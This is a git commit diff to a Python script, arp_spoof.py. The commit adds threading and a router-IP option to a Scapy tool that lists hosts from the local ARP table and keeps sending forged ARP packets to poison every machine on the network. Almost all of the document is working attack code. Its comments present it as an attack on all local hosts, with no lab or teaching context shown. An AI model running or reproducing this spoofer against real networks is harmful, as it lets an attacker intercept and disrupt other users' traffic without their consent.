91b8de3d730db5319c9ca1c3787c45f975939b90
Daniel Nazarian <naz1229@hotmail.com>
2020-09-13 21:06:06 -0400

    added threads to arp spoofer

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,25 +1,51 @@
+import _thread
 import os
 
 from scapy.all import *
 from scapy.layers.l2 import ARP
 from scapy.sendrecv import send
 
+
 # arp_spoof.py
 # this is a simply python program/script that will perform a simple ARP spoof
 # attack on all hosts on the local network using the Scapy Python library
 
 
-# get ip addresses of machines on local network
-full_results = [re.findall('^[\w\?\.]+|(?<=\s)\([\d\.]+\)|(?<=at\s)[\w\:]+', i) for i in os.popen('arp -a')]
-final_results = [dict(zip(['IP', 'LAN_IP', 'MAC_ADDRESS'], i)) for i in full_results]
-final_results = [{**i, **{'LAN_IP': i['LAN_IP'][1:-1]}} for i in final_results]
+def start_arp_spoof(router_ip='172.16.119.1'):
+	# get ip addresses of machines on local network
+	print("========================================")
+	full_results = [re.findall('^[\w\?\.]+|(?<=\s)\([\d\.]+\)|(?<=at\s)[\w\:]+', i) for i in os.popen('arp -a')]
+	final_results = [dict(zip(['IP', 'LAN_IP', 'MAC_ADDRESS'], i)) for i in full_results]
+	final_results = [{**i, **{'LAN_IP': i['LAN_IP'][1:-1]}} for i in final_results]
+	print("LOCAL IPS")
+	for res in final_results:
+		print("\t- " + str(res))
 
-# loop through and poison ALL hosts
-spoof = 'ROUTER IP'  # router IP
-op = 1  # Op code 1 for ARP requests
-for res in final_results:
-	arp = ARP(op=op, psrc=spoof, pdst=res['LAN_IP'], hwdst=res['MAC_ADDRESS'])
+	# loop through and poison ALL hosts
+	spoof = router_ip
+	op = 1  # Op code 1 for ARP requests
+	for res in final_results:
+		arp = ARP(op=op, psrc=spoof, pdst=res['LAN_IP'], hwdst=res['MAC_ADDRESS'])
+		_thread.start_new_thread(do_arp_spoof, (arp,))
 
-while 1:
-	send(arp)
-# time.sleep(2)
+
+def do_arp_spoof(arp):
+	while True:
+		send(arp)
+		time.sleep(2)
+
+
+# MAIN ============================================= #
+
+if __name__ == '__main__':
+	import optparse
+
+	parser = optparse.OptionParser()
+
+	parser.add_option(
+		'-r', '--router-ip', dest='router_ip',
+		help='Local network router IP address to bind to')
+
+	options, args = parser.parse_args()
+
+	start_arp_spoof(options.router_ip)
